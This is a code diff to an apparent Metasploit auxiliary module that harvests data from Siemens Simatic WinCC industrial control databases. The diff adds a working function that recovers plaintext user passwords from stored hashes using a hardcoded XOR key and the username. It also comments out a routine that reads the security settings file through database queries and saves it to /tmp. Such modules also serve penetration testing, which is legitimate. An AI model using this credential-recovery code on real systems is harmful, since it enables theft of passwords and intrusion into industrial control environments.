@@ -12,7 +12,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'	=> 'Simatic WinCC info harvester',
+			'Name'	=> 'Simatic WinCC information harvester',
 			'Description'	=> %q{
 				This module receives sensitive information from the WinCC database.
 			},
@@ -27,7 +27,6 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					[ 'URL', 'http://www.ptsecurity.com' ]
 				],
-			'Version'	=> '$Revision$',
 			'DisclosureDate'=> 'Jun 3 2012'
 			))
 		register_options(
@@ -35,6 +34,25 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('DOCUMENTS_FOLDER_NAME', [true, "Documents folder name", 'Documents']),
 			], self.class
 		)
+	end
+
+#####################################################
+# Decrypt password
+
+	def decrypt username, hash
+		key = "This is my encryptionkey"
+	    ascii = -> str { str .scan(/./)  .map{|c|c.ord} } # convert string to ascii array
+	    hex = -> num { num .scan(/../) .map{|n|n.to_i 16 if n.to_i>0} } # convert hex string to array
+	    key, hash = ascii.(key), hex.(hash[2..-1]) # remove 0x
+	
+	    username = ascii.(username.upcase) + [0] * (key.size - ascii.(username).size) # complements an array of zeroes element
+	    hash.delete(32) # delete spaces from ascii key array
+	    xor_key_user  = key.zip(hash) .reject{|i| i[1].nil? } .map{|x| x[0]^x[1]}  # xor each symbol key and hash
+	    xor_password = xor_key_user.zip(username) .map{|x| x[0]^x[1]} # xor previous step with username
+	    xor_password.select! {|sym| sym > 18} .map! { |sym| sym.chr}  # get password characters
+
+		xor_password.join
+
 	end
 	
 	def run
@@ -89,16 +107,16 @@ class Metasploit3 < Msf::Auxiliary
 			print_table %w|CONNECTIONNAME PARAMETER|	, prj[db]["plcs"], 	"WinCC PLCs"
 
 			#check file access through batched queries
-			if can_read_file? db
-				settings = read_file get_value("Security settings path"), db
+			# if can_read_file? db
+			# 	settings = read_file get_value("Security settings path"), db
 				
-				if settings # save results to file
-					File.open("/tmp/security_settings.xml", "w+") do |f|
-					f.puts settings
-					end
-				end	
+			# 	if settings # save results to file
+			# 		File.open("/tmp/security_settings.xml", "w+") do |f|
+			# 		f.puts settings
+			# 		end
+			# 	end	
 
-			end
+			# end
 			print_line
 		end
 	end
